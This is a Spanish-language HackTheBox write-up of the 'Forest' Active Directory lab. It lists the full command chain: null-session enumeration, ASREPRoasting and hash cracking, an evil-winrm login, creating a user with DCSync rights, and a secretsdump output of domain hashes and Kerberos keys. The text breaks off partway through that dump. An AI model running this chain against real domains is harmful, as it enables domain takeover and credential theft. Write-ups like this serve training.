---
layout: single
title: Writeup HTB - Maquina Forest
comments: true
excerpt: "La maquina Forest es una maquina windows - Easy, comenzamos enumerando por RPC usando rpcclient y obtenemos una lista de usuarios, realizaremos un ataque de ASREPRoast con la herramienta GetNPUsers.py obteniendo el TGT del user svc-alfresco. Por lo crackearemos el hash de svc-alfresco  que contiene el TGT con la herramienta john the ripper obteniendo el password de svc-alfresco. Nos conectamos con estas credenciales por winrm con la herramienta evil-winrm y escalamos privilegios con ayuda de la bloodhound donde descubrimos que SVC-ALFRESCO pertenece al grupo de SERVICE ACCOUNTS, PRIVILEGED IT ACCOUNTS, ACCOUNTS OPERATORS, los miembros del grupo ACCOUNTS OPERATORS tienen la capacidad de crear, eliminar y modificar cuentas de usuarios y grupos. El grupo de permisos de EXCHANGE WINDOWS PERMISSIONS tiene acceso WriteDacl en el objeto de dominio en Active Directory, lo que permite a cualquier miembro de este grupo modificar los privilegios del dominio, entre los que se encuentra el privilegio para realizar operaciones DCSync. Finalamente aprovechamos estos permisos con nuevo usuario creado y realizamos el ataque de dsync para despues usar un ataque de pass the hash para acceder con evil-winrm usando hash de administrator."
date: 2022-02-10
classes: wide
header:
  teaser: /assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Active Directory
  - Easy
---

# HTB - Forest
<p align="center">
<img src="/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Forest es una maquina windows - Easy, comenzamos enumerando por RPC usando rpcclient y obtenemos una lista de usuarios, realizaremos un ataque de ASREPRoast con la herramienta GetNPUsers.py obteniendo el TGT del user svc-alfresco. Por lo crackearemos el hash de svc-alfresco  que contiene el TGT con la herramienta john the ripper obteniendo el password de svc-alfresco. Nos conectamos con estas credenciales por winrm con la herramienta evil-winrm y escalamos privilegios con ayuda de la bloodhound donde descubrimos que SVC-ALFRESCO pertenece al grupo de SERVICE ACCOUNTS, PRIVILEGED IT ACCOUNTS, ACCOUNTS OPERATORS, los miembros del grupo ACCOUNTS OPERATORS tienen la capacidad de crear, eliminar y modificar cuentas de usuarios y grupos. El grupo de permisos de EXCHANGE WINDOWS PERMISSIONS tiene acceso WriteDacl en el objeto de dominio en Active Directory, lo que permite a cualquier miembro de este grupo modificar los privilegios del dominio, entre los que se encuentra el privilegio para realizar operaciones DCSync. Finalamente aprovechamos estos permisos con nuevo usuario creado y realizamos el ataque de dsync para despues usar un ataque de pass the hash para acceder con evil-winrm usando hash de administrator.
</div>

## Scan Nmap

```bash
# Nmap 7.92 scan initiated Wed Dec  8 13:44:34 2021 as: nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49184,49664,49665,49666,49667,49671,49680,49681,49685,49701 -oN targeted -Pn -vvv 10.129.95.210
Nmap scan report for 10.129.95.210
Host is up, received user-set (0.18s latency).
Scanned at 2021-12-08 13:44:34 -05 for 76s

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-12-08 18:51:32Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49184/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49701/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2021-12-08T18:52:25
|_  start_date: 2021-12-08T16:48:31
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-12-08T10:52:26-08:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16267/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36501/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43464/udp): CLEAN (Timeout)
|   Check 4 (port 32697/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2h46m50s, deviation: 4h37m10s, median: 6m49s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  8 13:45:50 2021 -- 1 IP address (1 host up) scanned in 76.60 seconds
```

## RPCClient

comenzamos la enumeracion por rcpclient, ingresando con una sesion nulla

```bash
Forest ❯ rpcclient -U "" -N 10.129.95.210
rpcclient $>
```

obtenemos toda la lista de usuarios

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

tambien obtenemos toda la lista de grupos

```bash
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```

También puedo buscar en un grupo sus miembros. Por ejemplo, el grupo de administradores de dominio tiene un miembro, rid 0x1f4:

```bash
rpcclient $> querygroup 0x200 
	Group Name:	Domain Admins
	Description:	Designated administrators of the domain
	Group Attribute:7
	Num Members:1
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
```

Esa es la cuenta de administrador:

```bash
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	Administrator
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	mié, 08 dic 2021 11:49:16 -05
	Logoff Time              :	mié, 31 dic 1969 19:00:00 -05
	Kickoff Time             :	mié, 31 dic 1969 19:00:00 -05
	Password last set Time   :	lun, 30 ago 2021 19:51:59 -05
	Password can change Time :	mar, 31 ago 2021 19:51:59 -05
	Password must change Time:	mié, 13 set 30828 21:48:05 -05
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000062
	padding1[0..7]...
	logon_hrs[0..21]...
```

asi que guardaremos todos los usuarios que enumeramos con rpcclient en un archivo de texto

```bash
❯ rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" | cut -d " " -f 1 | grep -oP "\[.*?\]" | tr -d "[]" > users.txt
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

## Ldap

esto es algo nuevo para mi pero podemos usar ldap para obtener informacion privilegiada, para ellos debemos empezar haciendo uno busqueda para obtener el nombre del dominio

First the query to get the domain base is `ldapsearch -x -h 10.10.10.175 -s base namingcontexts`, where:

- `x` - simple auth
- `h 10.10.10.175` - host to query
- `s base` - set the scope to base
- `naming contexts` - return naming contexts

```bash
❯ ldapsearch -x -h 10.129.95.210 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Ahora puedo usar -b 'DC=htb,DC=local' para obtener información sobre el dominio

```bash
> ldapsearch -x -h 10.129.95.210 -b 'DC=htb,DC=local'
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20211208164821.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
uSNChanged: 929834
name: htb

...[snip]...
```

la informacion es mucha pero busquemos objetos de clase Person (objectClass=Person)

```bash
> ldapsearch -x -h 10.129.95.210 -b 'DC=htb,DC=local' '(objectClass=Person)'
# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
 =htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Santi Rodriguez
sn: Rodriguez
givenName: Santi
distinguishedName: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,
 OU=Employees,DC=htb,DC=local
instanceType: 4
whenCreated: 20190920230255.0Z
whenChanged: 20190920230255.0Z
displayName: Santi Rodriguez
uSNCreated: 28837
uSNChanged: 28843
name: Santi Rodriguez
objectGUID:: VSlmUT29FkGHUAJ12EnggA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132134941751348277
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPgAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: santi
sAMAccountType: 805306368
userPrincipalName: santi@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20211209050600.0Z
dSCorePropagationData: 20211209050600.0Z
dSCorePropagationData: 20211209050600.0Z
dSCorePropagationData: 20211209050600.0Z
dSCorePropagationData: 16010101000000.0Z

# search reference
ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local

# search reference
ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local

# search reference
ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 34
# numEntries: 30
# numReferences: 3
```

aunque la informacion es mucha podemos podemos ver en sAMAccountName al usuario Santi entre otros

```bash
❯ ldapsearch -x -h 10.129.95.210 -b 'DC=htb,DC=local' '(objectClass=Person)' sAMAccountName

...[snip]...

# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
 C=local
sAMAccountName: andy

# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
 DC=local
sAMAccountName: mark

# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
 =htb,DC=local
sAMAccountName: santi

# search reference
ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local

# search reference
ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local

# search reference
ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 34
# numEntries: 30
# numReferences: 3
```

haciendo un grep podemos listar todos los usuarios, sin embargo yo usare la lista de usuario obtenidas en rpcclient

```bash
❯ ldapsearch -x -h 10.129.95.210 -b 'DC=htb,DC=local' '(objectClass=Person)' sAMAccountName | grep sAMAccountName
# requesting: sAMAccountName 
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
```

## ASREPRoast

El ASREPRoast es una técnica parecida a Kerberoasting que intenta crackear offline las contraseñas de los usuarios de servicio pero las de los que tienen el atributo DONT_REQ_PREAUTH, es decir, los que no se les requiere pre-autenticación en kerberos.

Para realizar este ataque usaremos la herramienta GETNPUsers.py, en esta ocasion usaremos esta herramienta para ver quien fue el ultimo usuario que se logueo y vemos que svc-alfresco no requiere preautenticacion en kerberos por eso podemos ver su hash

```bash
GetNPUsers.py -dc-ip 10.129.95.210 -request 'htb.local/'
```

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%201.png)

tambien podemos usar nuestra lista de usuarios para ver si alguien otro usuario con la caracteristica anteriormente mencionada

```bash
GetNPUsers.py -dc-ip 10.129.95.210 'htb.local/' -no-pass -usersfile users.txt -format john
```

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%202.png)

crackeamos dicho hash

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%203.png)

credenciales

```bash
svc-alfresco:s3rvice
```

validamos si podemos acceder con estas credenciales por smb o winrm

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%204.png)

nos conectamos por win-rm con la herramienta evil-winrm

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
```

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%205.png)

## Escalando Privilegios

para poder escalar privilegios nesecitarmos usar la herramienta bloodhound, dicha herramienta recopila informacion de la maquina victima y nos poporciona ayudas de forma grafica para poder escalar privilegios en domain controller.

para lograr nuestro cometido debemos subir SharpHound.exe a la maquina victima

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%206.png)

ejecutamos dicho binario

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%207.png)

descargamos el zip generado

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%208.png)

el comando anterior nos generar varios json, que los usaremos mas adelante. Asi que ejecutemos dichos comandos para correr bloodhound

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%209.png)

subimos nuestros archivos json de la siguiente manera

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2010.png)

buscamos todos los administradores del dominio

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2011.png)

buscamos usuarios ASREP Roastables y como confirmamos solo tenemos el usuario SVC-ALFRESCO

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2012.png)

hacemos click derecho al usuario svc-alfresco y ponemos Mark Users as Owned

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2013.png)

buscamos la ruta mas corta para ser administradores del dominio

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2014.png)

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2015.png)

- podemos ver que SVC-ALFRESCO pertenece al grupo de SERVICE ACCOUNTS, PRIVILEGED IT ACCOUNTS, ACCOUNTS OPERATORS.
- los miembros del grupo ACCOUNTS OPERATORS tienen la capacidad de crear, eliminar y modificar cuentas de usuarios y grupos.
- El grupo de permisos de EXCHANGE WINDOWS PERMISSIONS tiene acceso WriteDacl en el objeto de dominio en Active Directory, lo que permite a cualquier miembro de este grupo modificar los privilegios del dominio, entre los que se encuentra el privilegio para realizar operaciones DCSync

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2016.png)

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2017.png)

![Untitled](/assets/images/2022-02-11-writeup-maquina-htb-forest/Untitled%2018.png)

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user abeljm abeljm123 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" abeljm /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'abeljm123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\abeljm', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'abeljm' -TargetIdentity "HTB.LOCAL\Domain Admins" -Rights DCSync
```

```bash
Forest ❯ secretsdump.py abeljm:abeljm123@10.129.177.231
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
abeljm:10101:aad3b435b51404eeaad3b435b51404ee:bf3acac2da4924254ee59942452cf593:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:40c9add693a04eb31b2889e55a03530b:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
